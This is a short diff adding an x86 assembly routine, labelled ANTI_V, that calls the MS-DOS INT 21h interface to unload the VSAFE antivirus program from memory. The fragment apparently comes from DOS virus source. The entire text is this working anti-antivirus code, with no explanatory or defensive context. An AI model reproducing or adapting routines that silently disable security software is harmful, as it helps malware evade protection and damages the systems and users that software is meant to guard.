@@ -1,0 +1,8 @@
+;---------------------------------
+ANTI_V:                          ; 
+MOV AX,0FA01H                    ;REMOVE VSAFE FROM MEMORY        
+MOV DX,5945H                     ; 
+INT 21H                          ;           
+ret                              ;
+;---------------------------------
+
